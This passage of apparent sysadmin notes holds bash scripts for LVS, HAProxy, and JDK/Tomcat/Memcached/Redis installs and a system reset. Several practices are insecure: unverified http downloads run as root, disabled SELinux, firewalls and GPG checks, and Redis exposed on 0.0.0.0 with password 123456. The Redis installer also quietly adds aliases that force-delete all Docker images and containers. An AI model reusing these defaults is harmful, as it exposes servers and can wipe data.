    exit 1
    ;;
esac





[root@rs1 ~]# vim lvs_dr_vs.sh
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip='172.16.0.100'
iface='lo:1'
mask='255.255.255.255'
port='80'
rs1='10.0.0.7'
rs2='10.0.0.17'
scheduler='wrr'
type='-g'
rpm -q ipvsadm &> /dev/null || yum -y install ipvsadm &> /dev/null

case $1 in
start)
    ifconfig $iface $vip netmask $mask #broadcast $vip up
    iptables -F
 
    ipvsadm -A -t ${vip}:${port} -s $scheduler
    ipvsadm -a -t ${vip}:${port} -r ${rs1} $type -w 1
    ipvsadm -a -t ${vip}:${port} -r ${rs2} $type -w 1
    echo "The VS Server is Ready!"
    ;;
stop)
    ipvsadm -C
    ifconfig $iface down
    echo "The VS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac
```

### 4.14后端服务器一键上下线脚本

```
#!/bin/bash
#
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-05
#FileName：      lnmp.sh
#Description：   服务器上下线脚本
#********************************************************************
. /etc/init.d/functions
HOSTNAME=liu_webservers1
rpm -q socat || yum -y -q install socat

case $1 in
up)
    for i in {1..2};do
    echo "set weight ${HOSTNAME}/$2 1" | socat stdio /var/lib/haproxy/haproxy.sock$i
    [ $? -eq 0 ] && action "$2 is up"
   done
   ;;
down)
    for i in {1..2};do
    echo "set weight ${HOSTNAME}/$2 0" | socat stdio /var/lib/haproxy/haproxy.sock$i
    [ $? -eq 0 ] && action "$2 is down"
    done
   ;;
*)
   echo "Usage: `basename $0` up|down IP"
   ;;
esac
```

### 4.15 一键安装二进制JDK

```
#!/bin/bash
#      
#********************************************************************
#Author:         liusenbiao
#Date:           2022-07-05
#FileName：      install_jdk.sh
#Description：   在线一键安装二进制JDK
#********************************************************************
DIR=`pwd`
JDK_URL=http://liusenbiao.cn/download/tars/java
JDK_FILE="jdk-8u291-linux-x64.tar.gz"
JDK_DIR="/usr/local"


rpm -q wget &> /dev/null || yum -y -q install wget
color() {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$2" && $MOVE_TO_COL
    echo -n "["
    if [ $1 = "success" -o $1 = "0" ];then
       ${SETCOLOR_SUCCESS}
       echo -n $"  OK  "
    elif [ $1 = "failure" -o $1 = "1" ];then
       ${SETCOLOR_FAILURE}
       echo -n $"  FAILURE  "
    else
       ${SETCOLOR_WARNING}
       echo -n $"  WARNING  "
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo
}

install_jdk() {
wget $JDK_URL/$JDK_FILE
if ! [ -f "$DIR/$JDK_FILE" ];then
   color 1 "$JDK_FILE 文件不存在"
   exit;
elif [ -d $JDK_DIR/jdk ];then
   color 1 "JDK 已经安装"
   exit
else
   [ -d "JDK_DIR" ] || mkdir -pv $JDK_DIR
  fi
tar xvf $DIR/$JDK_FILE -C $JDK_DIR
cd $JDK_DIR && ln -s jdk1.8.* jdk

cat > /etc/profile.d/jdk.sh <<EOF
export JAVA_HOME=$JDK_DIR/jdk
export JRE_HOME=\$JAVA_HOME/jre
export CLASSPATH=\$JAVA_HOME/lib/:\$JRE_HOME/lib/
export PATH=\$PATH:\$JAVA_HOME/bin
EOF
source /etc/profile.d/jdk.sh
java -version && color 0  "JDK 安装完成" || { color 1 "JDK 安装失败"; exit; }

}


install_jdk
```

### 4.16 一键安装二进制Tomcat

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-05
#FileName：      install_tomcat.sh
#Description：  在线一键安装二进制JDK+二进制Tomcat
#********************************************************************

DIR=`pwd`
JDK_URL=http://liusenbiao.cn/download/tars/java
JDK_FILE="jdk-8u291-linux-x64.tar.gz"
TOMCAT_FILE="apache-tomcat-8.5.81.tar.gz"
JDK_DIR="/usr/local"
TOMCAT_DIR="/usr/local"
TCOMCAT_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.81/bin
TOMCAT_TAR=apache-tomcat-8.5.81.tar.gz

rpm -q wget &> /dev/null || yum -y -q install wget
color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$2" && $MOVE_TO_COL
    echo -n "["
    if [ $1 = "success" -o $1 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $1 = "failure" -o $1 = "1"  ] ;then
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo
}


install_jdk(){
wget $TCOMCAT_URL/$TOMCAT_TAR --no-check-certificate
wget $JDK_URL/$JDK_FILE
if !  [  -f "$DIR/$JDK_FILE" ];then
    color 1 "$JDK_FILE 文件不存在" 
    exit; 
elif [ -d $JDK_DIR/jdk ];then
    color 1  "JDK 已经安装" 
    exit
else 
    [ -d "$JDK_DIR" ] || mkdir -pv $JDK_DIR
fi
tar xvf $DIR/$JDK_FILE  -C $JDK_DIR
cd  $JDK_DIR && ln -s jdk1.8.* jdk 

cat >  /etc/profile.d/jdk.sh <<EOF
export JAVA_HOME=$JDK_DIR/jdk
export JRE_HOME=\$JAVA_HOME/jre
export CLASSPATH=\$JAVA_HOME/lib/:\$JRE_HOME/lib/
export PATH=\$PATH:\$JAVA_HOME/bin
EOF
.  /etc/profile.d/jdk.sh
java -version && color 0 "JDK 安装完成" || { color 1  "JDK 安装失败" ; exit; }

}

install_tomcat(){
if ! [ -f "$DIR/$TOMCAT_FILE" ];then
    color 1 "$TOMCAT_FILE 文件不存在" 
    exit; 
elif [ -d $TOMCAT_DIR/tomcat ];then
    color 1 "TOMCAT 已经安装" 
    exit
else 
    [ -d "$TOMCAT_DIR" ] || mkdir -pv $TOMCAT_DIR
fi
tar xf $DIR/$TOMCAT_FILE -C $TOMCAT_DIR
cd  $TOMCAT_DIR && ln -s apache-tomcat-*/  tomcat
echo "PATH=$TOMCAT_DIR/tomcat/bin:"'$PATH' > /etc/profile.d/tomcat.sh
id tomcat &> /dev/null || useradd -r -s /sbin/nologin tomcat

cat > $TOMCAT_DIR/tomcat/conf/tomcat.conf <<EOF
JAVA_HOME=$JDK_DIR/jdk
EOF

chown -R tomcat.tomcat $TOMCAT_DIR/tomcat/

cat > /lib/systemd/system/tomcat.service  <<EOF
[Unit]
Description=Tomcat
#After=syslog.target network.target remote-fs.target nss-lookup.target
After=syslog.target network.target 

[Service]
Type=forking
EnvironmentFile=$TOMCAT_DIR/tomcat/conf/tomcat.conf
ExecStart=$TOMCAT_DIR/tomcat/bin/startup.sh
ExecStop=$TOMCAT_DIR/tomcat/bin/shutdown.sh
RestartSec=3
PrivateTmp=true
User=tomcat
Group=tomcat

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now tomcat.service &> /dev/null
systemctl is-active tomcat.service &> /dev/null &&  color 0 "TOMCAT 安装完成" || { color 1 "TOMCAT 安装失败" ; exit; }

}

install_jdk 

install_tomcat
```

### 4.17一键编译安装Memcached脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_memcached.sh
#Description：  在线一键编译安装Memcached脚本
#********************************************************************
MEMCACHED_URL=http://liusenbiao.cn/download/tars/memcached
MEMCACHED=memcached-1.6.15
INSTALL_DIR=/apps/memcached

rpm -q wget &> /dev/null || yum -y install wget
yum -y install gcc  libevent-devel libmemcached


wget $MEMCACHED_URL/$MEMCACHED.tar.gz
tar xvf $MEMCACHED.tar.gz
cd $MEMCACHED/
./configure  --prefix=$INSTALL_DIR
make && make install

echo PATH=$INSTALL_DIR/bin:'$PATH' > /etc/profile.d/memcached.sh
. /etc/profile.d/memcached.sh

useradd -r -s /sbin/nologin memcached

cat > /etc/sysconfig/memcached <<EOF
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="64"
OPTIONS=""
EOF


cat > /lib/systemd/system/memcached.service  <<EOF
[Unit]
Description=memcached daemon
Before=httpd.service
After=network.target

[Service]
EnvironmentFile=/etc/sysconfig/memcached
ExecStart=$INSTALL_DIR/bin/memcached -p \${PORT} -u \${USER} -m \${CACHESIZE} -c \${MAXCONN} \$OPTIONS

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 
systemctl enable --now memcached.service
```

### 4.18一键编译安装Redis脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

#URL='https://download.redis.io/releases/'
URL='http://liusenbiao.cn/download/tars/redis/'
REDIS_FILE=redis-6.2.2.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

set_centos_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
}


main(){
    os
    check_file
    install
    set_centos_alias
}

main
```

### 4.19实时监控备份Redis中RDB文件脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-14
#FileName：     redis_backup_rdb.sh
#Description：  实时监控备份RDB文件的脚本
#********************************************************************
. /etc/init.d/functions
BACKUP=/backup/redis-rdb
DIR=/apps/redis/data
FILE=dump_6379.rdb
PASS=123456

color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$1" && $MOVE_TO_COL
    echo -n "["
    if [ $2 = "success" -o $2 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $2 = "failure" -o $2 = "1"  ] ;then
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo
}

redis-cli -h 127.0.0.1 -a $PASS --no-auth-warning  bgsave 
result=`redis-cli -a 123456 --no-auth-warning info Persistence |grep rdb_bgsave_in_progress| sed -rn 's/.*:([0-9]+).*/\1/p'`
until  [ $result -eq 0 ] ;do
    sleep 1
    result=`redis-cli -a 123456 --no-auth-warning info Persistence |grep rdb_bgsave_in_progress| sed -rn 's/.*:([0-9]+).*/\1/p'`
done
DATE=`date +%F_%H-%M-%S`

[ -e $BACKUP ] || { mkdir -p $BACKUP ; chown -R redis.redis $BACKUP; }
cp $DIR/$FILE $BACKUP/dump_6379-${DATE}.rdb

color "Backup redis RDB" 0
```

### 4.20安装系统后一键reset配置脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：一键reset基础配置脚本
#********************************************************************
COLOR="echo -e \\033[01;31m"
END='\033[0m'

os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
    OS_RELEASE=`lsb_release -rs`
    OS_RELEASE_VERSION=`lsb_release -rs |awk -F'.' '{print $1}'`
}

disable_selinux(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        sed -ri.bak 's/^(SELINUX=).*/\1disabled/' /etc/selinux/config
        ${COLOR}"${OS_ID} ${OS_RELEASE} SELinux已禁用,请重新启动系统后才能生效!"${END}
    else
        ${COLOR}"${OS_ID} ${OS_RELEASE} SELinux默认没有安装,不用设置!"${END}
    fi
}

disable_firewall(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        rpm -q firewalld &> /dev/null && { systemctl disable --now firewalld &> /dev/null; ${COLOR}"${OS_ID} ${OS_RELEASE} Firewall防火墙已关闭!"${END}; } || ${COLOR}"${OS_ID} ${OS_RELEASE} 没有firewall防火墙服务,不用关闭！"${END}
    else
        dpkg -s ufw &> /dev/null && { systemctl disable --now ufw &> /dev/null; ${COLOR}"${OS_ID} ${OS_RELEASE} ufw防火墙已关闭!"${END}; } || ${COLOR}"${OS_ID} ${OS_RELEASE}  没有ufw防火墙服务,不用关闭！"${END}
    fi
}

set_yum_centos8(){
    mkdir /etc/yum.repos.d/backup
    mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup
    cat > /etc/yum.repos.d/base.repo <<-EOF
[BaseOS]
name=BaseOS
baseurl=https://mirrors.aliyun.com/centos/8/BaseOS/x86_64/os
        https://mirrors.cloud.tencent.com/centos/8/BaseOS/x86_64/os/
gpgcheck=0

[AppStream]
name=AppStream
baseurl=https://mirrors.aliyun.com/centos/8/AppStream/x86_64/os/
        http://mirrors.sohu.com/centos/8/AppStream/x86_64/os/
gpgcheck=0

[EPEL]
name=EPEL
baseurl=https://repo.huaweicloud.com/epel/8/Everything/x86_64/
        https://mirrors.aliyun.com/epel/8/Everything/x86_64/
        https://mirrors.cloud.tencent.com/epel/8/Everything/x86_64/
        https://mirrors.tuna.tsinghua.edu.cn/epel/8/Everything/x86_64/
gpgcheck=0
enabled=1

[extras]
name=extras
baseurl=https://mirrors.aliyun.com/centos/8/extras/x86_64/os/
        https://repo.huaweicloud.com/centos/8/extras/x86_64/os/
        https://mirrors.tuna.tsinghua.edu.cn/centos/8/extras/x86_64/os/
        http://mirrors.163.com/centos/8/extras/x86_64/os/
gpgcheck=0
enabled=1

[centosplus]
name=centosplus
baseurl=https://mirrors.aliyun.com/centos/8/centosplus/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/centosplus/x86_64/os/
        http://mirrors.sohu.com/centos/8/centosplus/x86_64/os/
gpgcheck=0
enabled=0


[PowerTools]
name=PowerTools
baseurl=https://mirrors.aliyun.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.huaweicloud.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.tuna.tsinghua.edu.cn/centos/8/PowerTools/x86_64/os/
        http://mirrors.163.com/centos/8/PowerTools/x86_64/os/
        http://mirrors.sohu.com/centos/8/PowerTools/x86_64/os/
gpgcheck=0
enabled=0
EOF
    dnf clean all &> /dev/null
    dnf repolist &> /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} YUM源设置完成!"${END}
}

set_yum_centos7(){
    mkdir /etc/yum.repos.d/backup
    mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup
    cat > /etc/yum.repos.d/base.repo <<-EOF
[base]
name=base
baseurl=https://mirrors.aliyun.com/centos/\$releasever/os/\$basearch/
        https://repo.huaweicloud.com/centos/\$releasever/os/\$basearch/
        https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/\$releasever/os/\$basearch/
        http://mirrors.163.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/os/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[epel]
name=epel
baseurl=https://mirrors.aliyun.com/epel/\$releasever/\$basearch/
        https://repo.huaweicloud.com/epel/\$releasever/\$basearch/
        https://mirrors.cloud.tencent.com/epel/\$releasever/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/epel/\$releasever/\$basearch/
        https://mirrors.sohu.com/fedora-epel/\$releasever/\$basearch/
gpgcheck=1
gpgkey=https://mirrors.aliyun.com/epel/RPM-GPG-KEY-EPEL-\$releasever

[extras]
name=extras
baseurl=https://mirrors.aliyun.com/centos/\$releasever/extras/\$basearch/
        https://repo.huaweicloud.com/centos/\$releasever/extras/\$basearch/
        https://mirrors.cloud.tencent.com/centos/\$releasever/extras/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/\$releasever/extras/\$basearch/
        http://mirrors.163.com/centos/\$releasever/extras/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/extras/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[updates]
name=updates
baseurl=https://mirrors.aliyun.com/centos/\$releasever/updates/\$basearch/
        https://repo.huaweicloud.com/centos/\$releasever/updates/\$basearch/
        https://mirrors.cloud.tencent.com/centos/\$releasever/updates/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/\$releasever/updates/\$basearch/
        http://mirrors.163.com/centos/\$releasever/updates/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/updates/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[centosplus]
name=centosplus
baseurl=https://mirrors.aliyun.com/centos/\$releasever/centosplus/\$basearch/
        https://repo.huaweicloud.com/centos/\$releasever/centosplus/\$basearch/
        https://mirrors.cloud.tencent.com/centos/\$releasever/centosplus/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/\$releasever/centosplus/\$basearch/
        http://mirrors.163.com/centos/\$releasever/centosplus/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/centosplus/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever
EOF
    yum clean all &> /dev/null
    yum repolist &> /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} YUM源设置完成!"${END}
}

set_yum_centos6(){
    mkdir /etc/yum.repos.d/backup
    mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup
    cat > /etc/yum.repos.d/base.repo <<-EOF
[base]
name=base
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/os/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/os/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/os/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[epel]
name=epel
baseurl=https://mirrors.cloud.tencent.com/epel/\$releasever/\$basearch/
        https://archives.fedoraproject.org/pub/archive/epel/\$releasever/\$basearch/
gpgcheck=1
gpgkey=https://mirrors.cloud.tencent.com/epel/RPM-GPG-KEY-EPEL-\$releasever

[extras]
name=extras
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/extras/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/extras/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/extras/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[updates]
name=updates
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/updates/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/updates/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/updates/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[centosplus]
name=centosplus
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/centosplus/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/centosplus/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/centosplus/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever
EOF
    yum clean all &> /dev/null
    yum repolist  &> /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} YUM源设置完成!"${END}
}

set_apt_18(){
    mv /etc/apt/sources.list /etc/apt/sources.list.bak
    cat > /etc/apt/sources.list <<-EOF
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
EOF
    apt update
    ${COLOR}"${OS_ID} ${OS_RELEASE} APT源设置完成!"${END}
}

set_apt_20(){
    mv /etc/apt/sources.list /etc/apt/sources.list.bak
    cat > /etc/apt/sources.list <<-EOF
deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
EOF
    apt update
    ${COLOR}"${OS_ID} ${OS_RELEASE} APT源设置完成!"${END}
}

set_package_repository(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        if [ ${OS_RELEASE_VERSION} == "8" ] &> /dev/null;then
            set_yum_centos8
        elif [ ${OS_RELEASE_VERSION} == "7" ] &> /dev/null;then
            set_yum_centos7
        else
            set_yum_centos6
        fi
    else
        if [ ${OS_RELEASE_VERSION} == "18" ] &> /dev/null;then
            set_apt_18
        else
            set_apt_20
        fi
    fi
}

optimization_sshd(){
    sed -i.bak -e 's/#UseDNS no/UseDNS no/' -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/' /etc/ssh/sshd_config
    if [ ${OS_RELEASE_VERSION} == "6" ] &> /dev/null;then
        service sshd restart
    else
        systemctl restart sshd
    fi
    ${COLOR}"${OS_ID} ${OS_RELEASE} SSH已优化完成!"${END}
}

set_centos_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} 系统别名已设置成功,请重新登陆后生效!"${END}
}

set_ubuntu_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} 系统别名已设置成功,请重新登陆后生效!\e[0m"${END}
}

set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}

set_vimrc(){
    cat >~/.vimrc <<-EOF  
set ts=4
set expandtab
set ignorecase
set cursorline
set autoindent
autocmd BufNewFile *.sh exec ":call SetTitle()"
func SetTitle()
    if expand("%:e") == 'sh'
    call setline(1,"#!/bin/bash")
    call setline(2,"#")
    call setline(3,"#**********************************************************************************************")
